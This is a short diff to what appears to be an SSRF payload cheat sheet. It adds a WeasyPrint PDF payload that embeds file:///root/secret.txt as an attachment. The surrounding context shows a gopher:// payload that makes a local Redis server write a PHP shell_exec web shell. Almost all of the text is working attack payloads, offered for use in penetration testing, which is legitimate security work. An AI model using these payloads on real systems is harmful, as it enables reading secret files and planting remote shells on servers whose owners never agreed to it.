@@ -407,6 +407,14 @@ gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-
 gopher://127.0.0.1:6379/_save
 ```
 
+## SSRF exploiting PDF file
+
+Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR6c&feature=emb_title)
+
+```powershell
+<link rel=attachment href="file:///root/secret.txt">
+```
+
 ## SSRF to XSS 
 
 by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
